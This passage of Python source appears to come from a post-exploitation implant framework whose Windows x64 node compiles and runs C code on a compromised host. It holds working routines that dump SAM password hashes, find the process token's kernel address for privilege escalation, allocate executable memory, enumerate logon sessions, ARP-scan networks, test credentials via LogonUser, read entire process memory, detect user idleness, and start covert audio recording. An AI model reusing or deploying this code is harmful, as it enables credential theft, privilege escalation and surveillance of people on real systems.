        vars            = {}
        vars["hDomain"] = hDomain

        code            = """
        #import "local","samsrv.dll|SamrEnumerateUsersInDomain" as "SamrEnumerateUsersInDomain"
        #import "local","samsrv.dll|SamrOpenUser" as "SamrOpenUser"
        #import "local","samsrv.dll|SamIFree_SAMPR_USER_INFO_BUFFER" as "SamIFree_SAMPR_USER_INFO_BUFFER"
        #import "local","samsrv.dll|SamIFree_SAMPR_ENUMERATION_BUFFER" as "SamIFree_SAMPR_ENUMERATION_BUFFER"
        #import "local","samsrv.dll|SamrQueryInformationUser" as "SamrQueryInformationUser"

        #import "long long", "hDomain" as "hDomain"
        #import "local", "sendunistring2self" as "sendunistring2self"
        #import "local", "sendint" as "sendint"
        #import "local", "sendlonglong" as "sendlonglong"
        #import "local", "senddata2self" as "senddata2self"

        struct LSA_UNICODE_STRING {
           unsigned short Length;
           unsigned short MaximumLength;
           int pad1;
           long long Buffer;
        };

        struct SAM_USER_INFO {
          int rid;
          int pad1;
          struct LSA_UNICODE_STRING name;
        };

        struct SAM_USER_ENUM {
         int count;
         int pad1;
         struct SAM_USER_INFO *users;
        };

        void main()
        {
        int i;
        int rid;
        int ret;
        int numret;

        long long hUser;
        long long dwEnum;

        struct SAM_USER_ENUM *pEnum;
        struct SAM_USER_INFO *puinfo;
        struct LSA_UNICODE_STRING *pLSAUS;
        unsigned char *pUserInfo;


        dwEnum = 0; //dwEnum is the enumerate handle [in,out]
        pEnum = 0;
        numret = 0;

        ret = SamrEnumerateUsersInDomain(hDomain, &dwEnum, 0, &pEnum, 1000, &numret);


        if (ret==0 || ret==0x105) {
            sendint(1); //0 on success
            sendint(numret);

            puinfo = pEnum->users;
            i = 0;
            while ( i < numret) {
               i = i+1;

               //puinfo is pointing to our user
               rid = puinfo->rid;
               // MAXIMUM_ALLOWED=0x0200000
               sendint(rid);
               pLSAUS = puinfo->name;
               senddata2self(pLSAUS->Buffer, pLSAUS->Length);

               ret = SamrOpenUser(hDomain, 0x02000000, rid, &hUser);

               if (ret<0) {
                   sendint(0);
                   sendint(ret);
               }
               else {
                 sendint(1);
                 //SAM_USER_INFO_PASSWORD_OWFS=0x12
                 pUserInfo = 0;
                 ret = SamrQueryInformationUser(hUser, 0x12, &pUserInfo);
                 if (ret < 0) {
                     //failure
                     senddata2self(pUserInfo, 0);
                 }
                 else {
                    senddata2self(pUserInfo, 32);
                    SamIFree_SAMPR_USER_INFO_BUFFER (pUserInfo, 0x12); //free stuff
                 }

               }
               //need to do SamrQueryInformationUser
               puinfo = puinfo+1; //we do +1==+32 correctly for pointers to structs! :>
            }
            SamIFree_SAMPR_ENUMERATION_BUFFER(pEnum); //free more stuff!
        }
        else {
          sendint(0);
          sendint(ret);
         }
        }
        """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint() #enumerate users ret
        allusers = []

        if ret == 1:
            numret = self.readint()
            self.log('Enumerated %d users' % numret)

            for i in range(0, numret):
                rid        = 0
                username   = ""
                userinfo_1 = ""
                userinfo_2 = ""

                rid = self.readint()
                username = self.readblock()
                username = username.replace('\0', '') #XXX: support Unicode someday :/
                self.log('User: %s Rid: 0x%x' % (username, rid))

                ret = self.readint() #open user
                if ret != 0:
                    #success
                    userinfo = self.readblock()
                    if userinfo != "":
                        userinfo_1 = userinfo[16:24]+userinfo[24:32]
                        userinfo_2 = userinfo[0:8]+userinfo[8:16]

                    #print "Userinfo=*%s*"%(cleanhexprint(userinfo_1)+":"+cleanhexprint(userinfo_2))
                    allusers += [(username, rid, userinfo_1, userinfo_2)]
                else:
                    #failure on openuser
                    errno = self.readint()
                retval=allusers
        else:
            errno = self.readint()
            retval = errno
            devlog("win32","Error on SamrEnumerateUsersInDomain(). 0x%8.8x" % uint32(errno))

        self.leave()
        return ret, retval

    def DeviceIoControlAddress(self, hDevice, IoControlCode, InBuffer="", OutBufferSize=0):
        vars={}
        vars['hDevice']       = hDevice
        vars['IoControlCode'] = IoControlCode
        vars['InBufferSize']  = len(InBuffer)
        vars['OutBufferSize'] = OutBufferSize

        code="""

        #import "local", "kernel32.dll|DeviceIoControl" as "DeviceIoControl"
        #import "local", "kernel32.dll|LocalAlloc" as "LocalAlloc"
        #import "local", "kernel32.dll|LocalFree" as "LocalFree"

        #import "local", "readdatafromself" as "readdatafromself"
        #import "local", "sendint" as "sendint"
        #import "local", "sendlonglong" as "sendlonglong"

        #import "long long", "hDevice" as "hDevice"
        #import "int",       "IoControlCode" as "IoControlCode"
        #import "int",       "InBufferSize" as "InBufferSize"
        #import "int",       "OutBufferSize" as "OutBufferSize"

        #define LPTR 0x0040 // LMEM_FIXED|LMEM_ZEROINIT

        void main() {
          int ret;
          int cb;

          void *in_buffer;
          void *out_buffer;

          in_buffer = 0;
          out_buffer = 0;

          // First allocate memory for input buffer, when needed
          if (InBufferSize > 0) {
              in_buffer = LocalAlloc(LPTR, InBufferSize);
              sendlonglong(in_buffer);

              if (in_buffer == 0) {
                  return;
              }
          }

          // Next, allocate memory for output buffer, when needed
          if (OutBufferSize > 0) {
              out_buffer = LocalAlloc(LPTR, OutBufferSize);
              sendlonglong(out_buffer);

              if (out_buffer == 0) {

                  if (InBufferSize > 0) {
                      LocalFree(in_buffer);
                  }

                  return;
              }
          }

          // Receive input buffer, when needed
          if (InBufferSize > 0) {
              readdatafromself(in_buffer, InBufferSize);
          }

          // Now, we do the call
          ret = DeviceIoControl(hDevice, IoControlCode, in_buffer, InBufferSize, out_buffer, OutBufferSize, &cb, 0);

          // Free buffers
          if (OutBufferSize > 0) {
              LocalFree(out_buffer);
          }

          if (InBufferSize > 0) {
              LocalFree(in_buffer);
          }

          sendint(ret);
        }
        """

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)

        if len(InBuffer) > 0:
            alloc_inp = self.readlonglong()

            if alloc_inp == 0:
                self.log('DeviceIoControlAddress/LocalAlloc(InBufferSize: %d) failed, aborting' % len(InBuffer))
                self.leave()
                return -1

            self.log('Allocated %d bytes at 0x%x' % (len(InBuffer), alloc_inp))

        if OutBufferSize > 0:
            alloc_out = self.readlonglong()

            if alloc_out == 0:
                self.log('DeviceIoControlAddress/LocalAlloc(OutBufferSize: %d) failed, aborting' % OutBufferSize)
                self.leave()
                return -1

            self.log('Allocated %d bytes at 0x%x' % (OutBufferSize, alloc_out))

        if len(InBuffer) > 0:
            self.log('Sending %d bytes (InBuffer)..' % len(InBuffer))
            self.writebuf(InBuffer)

        ret = self.readint()
        self.leave()
        return ret

    def get_process_token_ring0_address(self):
        """
        This is a helper function if you have arbitrary writes
        in ring0 on Windows this will resolve the current process
        TOKEN address so you can set TOKEN privileges.

        We simply read in the buffer needed to retrieve all of the handle
        information and use pure Python to cast to the proper structs.

        It returns the kernel address so you can use it in your exploit.
        """

        code = """
        #import "local",  "sendint" as "sendint"
        #import "local",  "writeblock2self" as "writeblock2self"
        #import "local",  "ntdll.dll|NtQuerySystemInformation" as "NtQuerySystemInformation"
        #import "local",  "kernel32.dll|LocalAlloc" as "LocalAlloc"
        #import "local",  "kernel32.dll|LocalFree" as "LocalFree"

        #define LPTR 0x0040 // LMEM_FIXED|LMEM_ZEROINIT

        void main()
        {
            int status;
            char* handle_buf;
            long long system_handle_size;
            long bytes_needed;
            int  k;

            status = 0;
            handle_buf = LocalAlloc(LPTR, 0x10000);

            if (handle_buf == 0) {
                sendint(-1);
                return;
            }

            status = NtQuerySystemInformation(16, handle_buf, 0x10000, &bytes_needed);

            if(status != 0)
            {
                while(status != 0)
                {
                    LocalFree(handle_buf);
                    system_handle_size = bytes_needed*2;
                    handle_buf = LocalAlloc(LPTR, system_handle_size);

                    if (handle_buf == 0) {
                        sendint(-1);
                        return;
                    }

                    k = system_handle_size;
                    status = NtQuerySystemInformation(16, handle_buf, k, &bytes_needed);
                }
            }

            if (status != 0) {
                sendint(0);
                sendint(status);
            } else {
                sendint(bytes_needed);
                writeblock2self(handle_buf,bytes_needed);
                LocalFree(handle_buf);
              }
            }
        """

        # get our process ID to match against handle.ProcessId
        pid = self.getpid()

        # grab the current process token
        h_token = self.openprocesstoken()
        self.log("Our Token: %08x" % h_token)

        # retrieve buffer of SYSTEM_HANDLES
        self.clearfunctioncache()
        request=self.compile(code,{})
        self.sendrequest(request)

        # receive the buffer size
        buf_size = self.readint(signed=True)

        if buf_size == -1:
            self.log('Could not allocate memory with LocalAlloc()')
            self.leave()
            return -1

        if buf_size == 0:
            self.log("%08x" % self.readint(signed=True))
            self.log('Failed to receive SYSTEM_HANDLE information.')
            self.leave()
            return -1

        self.log("Reading %d bytes from remote." % buf_size)
        system_handle_buffer = self.readbuf(buf_size)
        self.leave()

        if len(system_handle_buffer) != buf_size:
            self.log("Failed to retrieve full buffer. Exiting.")
            return -1

        self.log("Successfully read: %d bytes" % len(system_handle_buffer))

        # Now we find how many handles are available.
        handle_count = struct.unpack("<Q",system_handle_buffer[0:8])[0]

        count = 1
        kernel_address = -1

        # iterate over all handles in all processes looking for our newly
        # opened token handle
        while count < handle_count:
            handle_index = 8 + (count * 24)
            system_handle = system_handle_buffer[handle_index:handle_index + 24]

            target_pid    = struct.unpack("<L",system_handle[0:4])[0]
            target_handle = struct.unpack("<h",system_handle[6:8])[0]

            if target_pid == pid:
                if target_handle == h_token:
                    self.CloseHandle(h_token)
                    kernel_address = struct.unpack("<Q",system_handle[8:16])[0]
                    break

            count += 1

        return kernel_address

    def NtAllocateVirtualMemory(self, mapaddress, process=0xffffffffffffffff, size=0x1000, AllocType=None, ProtectionType=None):
        """
        Call NtAllocateVirtualMemory
        process of -1 is "current process psuedohandle"
        """
        if mapaddress == 0: mapaddress = 1

        if AllocType == None: AllocType = MEM_COMMIT|MEM_RESERVE

        if ProtectionType == None: ProtectionType = PAGE_EXECUTE_READWRITE

        vars={}
        vars["process"]     = process
        vars["size"]        = size
        vars["mapaddress"]  = mapaddress
        vars["alloctype"]   = AllocType
        vars["protecttype"] = ProtectionType

        code="""
        //start of code
        #import "local", "ntdll.dll|NtAllocateVirtualMemory" as "NtAllocateVirtualMemory"
        #import "local","sendint" as "sendint"

        #import "long long", "mapaddress" as "mapaddress"
        #import "long long", "size" as "size"
        #import "int", "alloctype" as "alloctype"
        #import "int", "protecttype" as "protecttype"
        #import "long long", "process" as "process"

        void main()
        {
            int i;
            long long baseaddr;
            long long regionsize;

            regionsize = size;
            baseaddr = mapaddress;

            i = NtAllocateVirtualMemory(process, &baseaddr, 0, &regionsize, alloctype, protecttype);
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def LocalAlloc(self, size):
        """
        Allocates data on the host
        """
        vars = {}
        vars["size"] = size

        code = """
        //start of code
        #import "local", "kernel32.dll|LocalAlloc" as "LocalAlloc"
        #import "local", "sendlonglong" as "sendlonglong"

        #import "long long", "size" as "size"

        #define LPTR 0x0040 // LMEM_FIXED|LMEM_ZEROINIT

        void main()
        {
           void *p;
           p = LocalAlloc(LPTR, size);
           sendlonglong(p);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readlonglong()
        self.leave()
        return ret

    def GetUserActive(self):
        """
        Returns time in milliseconds since user was last active.

        1 if we can detect that a user is active on the machine,
        0 otherwise.
        """
        code="""
        #import "local", "user32.dll|GetLastInputInfo" as "GetLastInputInfo"
        #import "local", "kernel32.dll|GetTickCount" as "GetTickCount"
        #import "local", "sendint" as "sendint"

        struct LASTINPUTINFO {
          int cbSize;
          int dwTime;
        };

        void main()
        {
           int ret;
           int tickcount;
           struct LASTINPUTINFO lastinput;
           lastinput.cbSize = 8; //sizeof(LASTINPUTINFO)
           ret=GetLastInputInfo(&lastinput);
           sendint(ret);
           if (ret==0) {
              //failed to run function
              return; //done
           }
          //ran function ok...now sending data
           sendint(lastinput.dwTime);
           tickcount=GetTickCount();
           sendint(tickcount);
        }
        """

        vars={}
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret:
            #gather time information
            dwTime=self.readint()
            tickcount=self.readint()
            self.leave() #done with all input
            self.log("Got tickcount %x and dwTime as %x"%(tickcount,dwTime))
            return tickcount-dwTime
        else:
            self.leave() #done with all input
            self.log("failed to determine if user was active or not, so assuming not...")
            return None
        return ret #never reached

    ##################################################################
    ### Porting funtionality implemented in win32Node to win64Node ###
    ##################################################################
    def recursive_dir_walk(self, path, function, func_arg=None): # copy/paste from win32Node
        """
        Given a starting point recursively walk the path performing the specified option when files are found
        and walking deeper down when directories are found.
        This is probably far from an efficient algorithm, but whatever it works .....
        """
        ##dodir either returns (num_entries !=0, (({prop_dict},path),...)) or (-1||0, [err code, path] )
        num_entries, dir_ret=self.dodir(path)

        if num_entries == -1:
            ##It was not a directory, so we assume it was a file
            try:
                if not func_arg:
                    function(dir_ret[1][:-2])
                else:
                    function(dir_ret[1][:-2], func_arg)
            except NodeCommandError, err:
                #print "PROBLEM: %s"%err
                pass


        else:
            for n in dir_ret:
                ##It was a directory so we query further
                if n[-1] == "." or n[-1] == "..":
                    continue
                self.recursive_dir_walk( "%s\\%s"%(path,n[-1]), function, func_arg)

    # using for GetAddressBookInfo
    def get_owner_of_process(self, pid):
        """
        For a specified pid get its owner
        http://nibuthomas.wordpress.com/2008/01/08/how-to-get-name-of-owner-of-a-process/

        http://xcybercloud.blogspot.com/2009/02/get-process-owner.html
        """
        vars={}
        vars["accessrights"] = TOKEN_QUERY
        vars["pToken"] = self.openprocess(pid)

        logging.debug("Getting token for %s - %s"%(pid,vars["pToken"]))

        code="""
        #import "local", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "local", "advapi32.dll|GetTokenInformation" as "GetTokenInformation"
        #import "local", "advapi32.dll|OpenProcessToken" as "OpenProcessToken"
        #import "local", "advapi32.dll|LookupAccountSidA" as "LookupAccountSidA"

        #import "int", "accessrights" as "accessrights"
        #import "long long", "pToken" as "pToken"

        #import "local","sendint" as "sendint"
        #import "local","sendstring" as "sendstring"

        struct SID_AND_ATTRIBUTES {
        char *Sid;
        int Attributes;
        };

        struct TOKEN_USER {
        struct SID_AND_ATTRIBUTES User;
        };

        // is actually an enum .. but whatever
        struct SID_NAME_USE_fakenum {
            int SidTypeUser;
            int SidTypeGroup;
            int SidTypeDomain;
            int SidTypeAlias;
            int SidTypeWellKnownGroup;
            int SidTypeDeletedAccount;
            int SidTypeInvalid;
            int SidTypeUnknown;
            int SidTypeComputer;
            int SidTypeLabel;
        };


        void main() {
        //Get the name of the owner of the process
        int ret;
        long long hToken;
        struct TOKEN_USER* userToken;
        struct SID_AND_ATTRIBUTES* pUser;
        struct SID_NAME_USE_fakenum nu;
        char name[512];
        char domain[512];
        int nameSize;
        int dwRequireSize;
        int TokenUser;
        char userInfo[128];
        int domainSize;

        hToken = 0;
        ret=OpenProcessToken(pToken, accessrights, &hToken);
        if (ret==0) {
          sendint(-1);
          return;
        }


        // retrieve user security info(SID) about this access token
        dwRequireSize = 0;

        TokenUser = 1 ;

        //XXX: Don't believe sizeof() works. Replace with an integer constant.
        //GetTokenInformation(hToken,TokenUser,&userInfo,sizeof(userInfo),&dwRequireSize);
        GetTokenInformation(hToken,TokenUser,&userInfo,128,&dwRequireSize);


         userToken = userInfo;
         nameSize = 512;
         domainSize = 512;
         pUser=userToken->User;


         if (LookupAccountSidA(0,pUser->Sid,name,&nameSize,domain,&domainSize,&nu))
          {
             sendint(1);
             sendstring(name);
          }
          else
          {
            sendint(-3);
          }
         }
        """
        ret=[]
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        success=sint32(self.readint())
        if success == 1:
            ret=self.readstring()
        self.leave()
        return ret

    # Used in info_sessions module
    def EnumSessions(self):
        vars = {}
        code = """
        #import "local", "secur32.dll|LsaEnumerateLogonSessions" as "LsaEnumerateLogonSessions"
        #import "local", "secur32.dll|LsaGetLogonSessionData" as "LsaGetLogonSessionData"
        #import "local", "secur32.dll|LsaFreeReturnBuffer" as "LsaFreeReturnBuffer"

        #import "local", "writeblock2self" as "writeblock2self"
        #import "local", "memcpy" as "memcpy"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        #import "local", "sendlonglong" as "sendlonglong"

        struct LUID {
            int  LowPart;
            int  HighPart;
        };

        struct LSA_UNICODE_STRING {
          unsigned short Length;
          unsigned short MaximumLength;
          int            padding; // align to 64bits
          char*          Buffer;  // wide char
        };

        struct LARGE_INTEGER {
          int lower;
          int higher;

        };

        struct LSA_LAST_INTER_LOGON_INFO {
          struct LARGE_INTEGER LastSuccessfulLogon;
          struct LARGE_INTEGER LastFailedLogon;
          int                  FailedAttemptCountSinceLastSuccessfulLogon;
        };

        struct SECURITY_LOGON_SESSION_DATA {
          unsigned int                     Size;                  // 00
          struct LUID                      LogonId;               // 04
          unsigned int                     Padding0;              // 12
          struct LSA_UNICODE_STRING        UserName;              // 16
          struct LSA_UNICODE_STRING        LogonDomain;           // 32
          struct LSA_UNICODE_STRING        AuthenticationPackage; // 48
          unsigned int                     LogonType;             // 64
          unsigned int                     Session;
          unsigned char *                  Sid;
          struct LARGE_INTEGER             LogonTime;
          struct LSA_UNICODE_STRING        LogonServer;
          struct LSA_UNICODE_STRING        DnsDomainName;
          struct LSA_UNICODE_STRING        Upn;
          unsigned long long               UserFlags;
          struct LSA_LAST_INTER_LOGON_INFO LastLogonInfo;
          struct LSA_UNICODE_STRING        LogonScript;
          struct LSA_UNICODE_STRING        ProfilePath;
          struct LSA_UNICODE_STRING        HomeDirectory;
          struct LSA_UNICODE_STRING        HomeDirectoryDrive;
          struct LARGE_INTEGER             LogoffTime;
          struct LARGE_INTEGER             KickOffTime;
          struct LARGE_INTEGER             PasswordLastSet;
          struct LARGE_INTEGER             PasswordCanChange;
          struct LARGE_INTEGER             PasswordMustChange;
        };

        void main()
        {
            int LogonSessionCount;

            struct LUID *LogonSessionList;
            struct SECURITY_LOGON_SESSION_DATA *sessionData;
            struct LSA_UNICODE_STRING wusername;
            struct LARGE_INTEGER hola;

            int rVal;
            int *session;
            char *username;
            unsigned int *p;
            long long *aux;
            int i;
            short *str_len;

            LogonSessionList = 0;
            rVal = LsaEnumerateLogonSessions(&LogonSessionCount, &LogonSessionList);
            sendint(rVal);

            if (rVal != 0){
                return;
            }

            sendint(LogonSessionCount);
            i = 0;

            while(i<LogonSessionCount) {
                session = LogonSessionList + i;

                rVal = LsaGetLogonSessionData(session, &sessionData);
                sendint(rVal);

                if (rVal == 0) {
                    username = sessionData;

                    p = username + 4;  // sessionData->LogonId.Lowpart
                    //debug();
                    sendint(*p);
                    p = username + 8;  // sessionData->LogonId.Highpart
                    sendint(*p);

                    // Sending Username
                    aux = username + 16 + 8;   // sessionData->Username.Buffer
                    str_len = username + 16;   // sessionData->Username.Length
                    sendint(*str_len);
                    //debug();
                    writeblock2self(*aux, *str_len);

                    // Sending Logon Domain
                    aux = username + 32 + 8;   // sessionData->LogonDomain.Buffer
                    str_len = username + 32;   // sessionData->LogonDomain.Length
                    sendint(*str_len);
                    writeblock2self(*aux, *str_len);

                    // Sending Authentication Type
                    aux = username + 48 + 8;   // sessionData->AuthenticationPackage.Buffer
                    str_len = username + 48;   // sessionData->AuthenticationPackage.Length
                    sendint(*str_len);
                    writeblock2self(*aux, *str_len);

                    // Sending Logon Type
                    p = username + 64;       // sessionData->LogonType
                    sendlonglong(*aux);

                    LsaFreeReturnBuffer(sessionData);
                }

                i = i + 1;
            }

            LsaFreeReturnBuffer(LogonSessionList);
        }
        """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)

        ret = self.readint()

        if ret != 0:
            self.leave()
            return (ret, None)
        else:
            sessions = []
            sessions_number = self.readint()

            for i in range(0, sessions_number):
                session = {}
                ret = self.readint()
                if ret != 0:
                    logging.error('EnumSessions(): LsaGetLogonSessionData()returned 0x%x' % ret)
                    continue

                logonid = []
                logonid.append(self.readint())
                logonid.append(self.readint())
                session['logonid']    = logonid
                session['username']   = self.read_uni_string()
                session['domain']     = self.read_uni_string()
                session['auth_type']  = self.read_uni_string()
                session['logon_type'] = self.readlonglong()
                sessions.append(session)

        self.leave()
        return (0, sessions)

    # Used in arpscan module
    def slowarpscan(self, network, netmask):
        hostlong = socket.gethostbyname(network)  # resolve from remotehost
        hostlong = str2bigendian(socket.inet_aton(hostlong))
        numberofips = 2 ** (32 - netmask)  # how many ip's total
        startip = hostlong & (~(numberofips - 1))  # need to mask it out so we don't do wacky things

        logging.info("Network to scan: %s" % network)
        logging.info("Number of ips to scan: %d" % numberofips)
        logging.info("Startip=%8.8x" % startip)

        vars={}
        vars["startip"]     = startip
        vars["numberofips"] = numberofips

        code="""
        #import "local", "iphlpapi.dll|SendARP" as "SendARP"

        #import "local", "htonl" as "htonl"
        #import "local", "sendint" as "sendint"
        #import "local", "writeblock2self" as "writeblock2self"

        #import "int", "startip" as "startip"
        #import "int", "numberofips" as "numberofips"

        void main()
        {
          int currentport;
          int sockfd;
          int fd;
          int doneips;
          int currentip;
          char pulMac[8];
          unsigned int ulLen;
          int ret;

          currentip = startip;
          doneips = 0;

          while (doneips < numberofips)
          {
               doneips = doneips + 1;
               ulLen = 6;

               //FOR EACH IP...
               ret = SendARP(htonl(currentip), 0, pulMac, &ulLen);
               if (ret == 0) {
                  sendint(currentip);
                  writeblock2self(pulMac, 6);
               }
               currentip = currentip + 1;
          }
          sendint(-1);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)

        ip = 0
        openhosts=[]
        while ip != -1:
            ip = sint32(self.readint())
            if ip != -1:
                host = socket.inet_ntoa(big_order(ip))
                logging.info("Open host=%s" % host)
                frommac = self.readbuf(6)
                openhosts.append((host,frommac))
        self.leave()
        return openhosts

    # Use in LogonUser module
    def LogonUser(self, lpszUsername, lpszPassword, lpszDomain=None, dwLogonType=LOGON32_LOGON_INTERACTIVE, dwLogonProvider=LOGON32_PROVIDER_DEFAULT):
        """
        http://msdn2.microsoft.com/en-us/library/aa378184(VS.85).aspx

        This requires SeTcbPrivileges .. so you have to migrate into e.g. LSASS for it to work and give you a token!
        """
        vars={}

        vars["lpszUsername"] = lpszUsername
        vars["lpszPassword"] = lpszPassword

        if '@' in lpszUsername: # upn formatted .. domain == NULL
            vars["lpszDomain"] = ""
            vars["setDomain"] = 0

        elif lpszDomain != None: # domain hardset
            vars["lpszDomain"] = lpszDomain
            vars["setDomain"] = 1

        else: # get the local domain automagically ..

            domain_vars = {}
            domain_code = """
            #import "local", "advapi32.dll|GetUserNameA" as "GetUserNameA"
            #import "local", "kernel32.dll|GetLastError" as "GetLastError"
            #import "local", "advapi32.dll|LookupAccountNameA" as "LookupAccountNameA"

            #import "local", "sendint" as "sendint"
            #import "local", "sendstring" as "sendstring"

            // is actually an enum .. but whatever
            struct SID_NAME_USE_fakenum {
                int SidTypeUser;
                int SidTypeGroup;
                int SidTypeDomain;
                int SidTypeAlias;
                int SidTypeWellKnownGroup;
                int SidTypeDeletedAccount;
                int SidTypeInvalid;
                int SidTypeUnknown;
                int SidTypeComputer;
                int SidTypeLabel;
            };

            void main()
            {
                struct SID_NAME_USE_fakenum psid_name_use;

                char lpAccountName[512];
                char lpDomainName[512];
                char SID[512]; // just a placeholder for the struct muck
                unsigned int n;
                int i;
                int ret;
                int err;

                psid_name_use.SidTypeUser = 1;  // SidTypeGroup

                n = 512;
                ret = GetUserNameA(lpAccountName, &n);
                sendint(ret);
                if (ret == 0)
                {
                    err = GetLastError();
                    sendint(err);
                }
                else
                {
                    sendstring(lpAccountName); // send account name

                    // lookup account muck
                    n = 512;
                    i = 512;
                    ret = LookupAccountNameA(0, lpAccountName, SID, &i, lpDomainName, &n, &psid_name_use);
                    err = 0;
                    sendint(ret);
                    if (ret == 0)
                    {
                        err = GetLastError();
                        sendint(err);
                    }
                    else
                    {
                        sendstring(lpDomainName);
                    }
                }
            }

            """

            self.clearfunctioncache()
            request = self.compile(domain_code, domain_vars)
            self.sendrequest(request)

            # getusername call
            ret = sint32(self.readint())
            if ret == 0:  # failed
                err = sint32(self.readint())
                logging.debug("GetUserName() Failed! (ERROR: %X)" % err)

            else:  # success .. lookupaccountname call
                UserName = self.readstring()
                logging.debug("GetUserName() Worked! (RETVL: %X - USER: %s)" % (ret, UserName))

                ret = sint32(self.readint())
                if ret == 0:  # failed
                    err = sint32(self.readint())
                    logging.debug("LookupAccountName() Failed! (ERROR: %X)" % err)

                else:  # success read domain string
                    lpszDomain = self.readstring()
                    logging.debug("Got Local Domain: %s" % lpszDomain)

            self.leave()

            vars["lpszDomain"] = lpszDomain
            vars["setDomain"] = 1

        vars["dwLogonType"] = dwLogonType
        vars["dwLogonProvider"] = dwLogonProvider

        code="""
        #import "local", "advapi32.dll|LogonUserA" as "LogonUserA"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"

        #import "string", "lpszUsername" as "lpszUsername"
        #import "string", "lpszPassword" as "lpszPassword"
        #import "string", "lpszDomain" as "lpszDomain"

        #import "int", "setDomain" as "setDomain"
        #import "int", "dwLogonType" as "dwLogonType"
        #import "int", "dwLogonProvider" as "dwLogonProvider"

        void main()
        {
            int ret;
            int err;
            int phToken;

            // ASCII for now so we can test until we figure out the unicode muck
            if (setDomain == 1)
            {
                ret = LogonUserA(lpszUsername, lpszDomain, lpszPassword, dwLogonType, dwLogonProvider, &phToken);
            }
            else
            {
                ret = LogonUserA(lpszUsername, 0, lpszPassword, dwLogonType, dwLogonProvider, &phToken);
            }

            sendint(ret); // return val
            sendint(err); // error code if any
            sendint(phToken); // token handle
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)

        ret = sint32(self.readint())
        err = sint32(self.readint())
        phToken = sint32(self.readint())

        self.leave()

        return (ret, err, phToken, lpszDomain)


    def getallprocessmemory(self,pid):
        """
        Gets all of a processes memory. For later use
        we need to optimize this to pass us MD5 hashes
        and then store those locally, and if we don't have them, then ask for
        the entire packet of data.
        """
        vars={}
        code="""
        #import "local","kernel32.dll|OpenProcess" as "OpenProcess"
        #import "local","kernel32.dll|ReadProcessMemory" as "ReadProcessMemory"
        #import "local","kernel32.dll|CloseHandle" as "CloseHandle"


        #import "local", "memset" as "memset"
        #import "local", "sendint" as "sendint"
        #import "local", "sendlonglong" as "sendlonglong"

        #import "local", "senddata2self" as "senddata2self"
        #import "local", "debug" as "debug"
        #import "int", "pid" as "pid"

        void main()
        {
            int ret;
            int i;
            int access;
            int athread;
            int mythreadid;
            unsigned long long mempage;
            unsigned long long numberofbytesread;
            unsigned long long buffersize;
            unsigned long long process;
            char buffer[1024];

            buffersize=1024;
            access=0x1F0FFF; //processallaccess

            //access,inherithandle,pid
            //debug();
            process=OpenProcess(access,0,pid);
            sendlonglong(process);
            if (process==0) {
              return;
            }

            mempage=0;
            while (mempage<0x7fff00000000) {
                 ret=ReadProcessMemory(process,mempage,buffer,buffersize,&numberofbytesread);
                 //nonzero on success
                 if (ret) {
                    sendlonglong(mempage);
                    senddata2self(buffer,numberofbytesread);
                 }

                 mempage=mempage+buffersize;
            }
            CloseHandle(process);
            sendlonglong(-1); //end our list here
        }
        """

        self.clearfunctioncache()
        vars["pid"]=pid
        request=self.compile(code,vars)
        self.sendrequest(request)
        mempage=0
        allprocessdata=[]
        processhandle=self.readlonglong()
        logging.debug("my processhandle=%#x" % processhandle)
        if processhandle:
            while mempage!=-1:
                value = self.readlonglong()
                mempage=sint64(value)

                if mempage!=-1:
                    memdata=self.readblock()
                    allprocessdata+=[(mempage,memdata)]

                    logging.debug("Address: %8.8x" % mempage)
                    logging.debug("Datalength: %d" % len(memdata))
        else:
            pass # end=self.readlonglong()

        self.leave()
        return allprocessdata

    def drinkcoaster(self,drive):
        """
        ejects the cdrom
        """

        vars={}
        vars["file"]="\\\\.\\\\"+drive
        vars["GENERIC_READ"]=GENERIC_READ
        vars["FILE_SHARE_READ"]=FILE_SHARE_READ
        vars["OPEN_EXISTING"]=OPEN_EXISTING
        code="""
        #import "local", "kernel32.dll|CreateFileA" as "CreateFileA"
        #import "local", "kernel32.dll|DeviceIoControl" as "DeviceIoControl"
        #import "local", "kernel32.dll|CloseHandle" as "CloseHandle"

        #import "local","sendint" as "sendint"
        #import "local","debug" as "debug"
        #import "string","file" as "file"

        #import "int","GENERIC_READ" as "GENERIC_READ"
        #import "int","FILE_SHARE_READ" as "FILE_SHARE_READ"
        #import "int","OPEN_EXISTING" as "OPEN_EXISTING"


        void main() {
          long long ret;
          long long h;
          char empty[1];

          empty[0]=0;
          //debug();
          h=CreateFileA(file,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
          ret=0;
          DeviceIoControl(h,0x002d4808,empty,0,empty,0,&ret,0);
          CloseHandle(h);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.leave()
        return

    def recordaudio(self, seconds=10, progr=False):
        code ="""
        #import "local", "winmm.dll|waveInPrepareHeader" as "waveInPrepareHeader"
        #import "local", "winmm.dll|waveInOpen" as "waveInOpen"
        #import "local", "winmm.dll|waveInClose" as "waveInClose"
        #import "local", "winmm.dll|waveInAddBuffer" as "waveInAddBuffer"
        #import "local", "winmm.dll|waveInStart" as "waveInStart"
        #import "local", "winmm.dll|waveInStop" as "waveInStop"
        #import "local", "winmm.dll|waveInUnprepareHeader" as "waveInUnprepareHeader"
        #import "local", "winmm.dll|waveInGetNumDevs" as "waveInGetNumDevs"
        #import "local", "kernel32.dll|GlobalAlloc" as "GlobalAlloc"
        #import "local", "kernel32.dll|GlobalFree" as "GlobalFree"
